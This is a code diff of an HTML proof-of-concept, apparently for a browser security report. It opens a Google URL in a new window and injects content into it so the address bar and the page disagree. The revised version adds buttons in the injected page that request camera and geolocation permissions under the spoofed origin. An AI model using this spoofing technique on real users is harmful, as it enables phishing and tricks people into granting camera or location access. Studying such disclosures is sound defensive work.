@@ -1,46 +1,62 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>UI State Test</title>
-</head>
 <body>
-<h2>Opening trusted page…</h2>
+<button onclick="go()">go</button>
 
 <script>
-(function () {
-    // 1. Open a trusted site in a new window
-    const w = window.open("https://google.com/csi");
+function go() {
+  var x = window.open('https://www.google.com/csi');
 
-    // 2. After navigation lifecycle settles
-    setTimeout(() => {
-        try {
-            // 3. Hook into navigation restore / BFCache
-            w.addEventListener("pageshow", function () {
-                // 4. Replace visible content (no phishing)
-                w.document.documentElement.innerHTML = `
-                  <body style="font-family:sans-serif">
-                    <h1>UI Trust Indicator Test</h1>
-                    <p>
-                      The address bar still shows:
-                      <b>${w.location.href}</b>
-                    </p>
-                    <p>
-                      But this content was injected after navigation lifecycle.
-                    </p>
-                    <p style="color:red">
-                      This demonstrates address bar / content desynchronization.
-                    </p>
-                  </body>
-                `;
-            });
-        } catch (e) {
-            console.log("Blocked:", e);
-        }
-    }, 2000);
-})();
+  setTimeout(function () {
+    try {
+      x.document.body.innerHTML = `
+        <h1>Browser UI Trust Test</h1>
+        <p>
+          Address bar shows:
+          <b>${x.location.href}</b>
+        </p>
+
+        <p>
+          The content below was injected via DOM manipulation.
+        </p>
+
+        <button onclick="requestLocation()">Request Location</button>
+        <button onclick="requestCamera()">Request Camera</button>
+
+        <pre id="log"></pre>
+
+        <script>
+          function log(msg) {
+            document.getElementById('log').textContent += msg + "\\n";
+          }
+
+          function requestLocation() {
+            if (!navigator.geolocation) {
+              log("Geolocation not supported");
+              return;
+            }
+            navigator.geolocation.getCurrentPosition(
+              () => log("Geolocation permission GRANTED"),
+              (e) => log("Geolocation denied: " + e.message)
+            );
+          }
+
+          function requestCamera() {
+            if (!navigator.mediaDevices) {
+              log("Camera API not supported");
+              return;
+            }
+            navigator.mediaDevices.getUserMedia({ video: true })
+              .then(() => log("Camera permission GRANTED"))
+              .catch(e => log("Camera denied: " + e.name));
+          }
+        <\/script>
+      `;
+    } catch (e) {
+      console.log(e);
+    }
+  }, 3000);
+}
 </script>
 </body>
 </html>
-
-
